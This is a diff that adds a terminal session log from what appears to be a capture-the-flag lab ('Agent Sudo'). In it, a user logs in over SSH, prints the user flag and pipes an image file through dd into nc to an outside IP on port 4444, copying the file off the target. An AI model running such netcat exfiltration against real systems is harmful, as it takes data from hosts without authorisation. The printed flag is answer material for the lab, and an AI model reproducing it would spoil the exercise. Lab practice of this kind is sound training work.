@@ -1,0 +1,35 @@
+Script started on 2025-04-04 14:24:55+03:00 [COMMAND="ssh james@agent.sudo.thm" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+The authenticity of host 'agent.sudo.thm (10.10.164.80)' can't be established.
+ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'agent.sudo.thm' (ED25519) to the list of known hosts.
+james@agent.sudo.thm's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 1.0
+
+
+75 packages can be updated.
+33 updates are security updates.
+
+
+Last login: Tue Oct 29 14:26:27 2019
+]0;james@agent-sudo: ~[01;32mjames@agent-sudo[00m:[01;34m~[00m$ ls
+[0m[01;35mAlien_autospy.jpg[0m  user_flag.txt
+]0;james@agent-sudo: ~[01;32mjames@agent-sudo[00m:[01;34m~[00m$ cat user_flag.txt
+b03d975e8c92a7c04146cfa7a5a313c7
+]0;james@agent-sudo: ~[01;32mjames@agent-sudo[00m:[01;34m~[00m$ dd iof[Kf=Alien_autospy.jpg stauts[K[K[Ktus[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1P[1@f[2@(reverse-i-search)`':[C[C[C[C[C[C^C
+]0;james@agent-sudo: ~[01;32mjames@agent-sudo[00m:[01;34m~[00m$ dd if=Alien_autospy.jpg status=progress | nc 10.8.61.245 4444
+82+1 records in
+82+1 records out
+42189 bytes (42 kB, 41 KiB) copied, 0.00162288 s, 26.0 MB/s
+]0;james@agent-sudo: ~[01;32mjames@agent-sudo[00m:[01;34m~[00m$ exit
+logout
+Connection to agent.sudo.thm closed.
+
+Script done on 2025-04-04 14:43:38+03:00 [COMMAND_EXIT_CODE="0"]
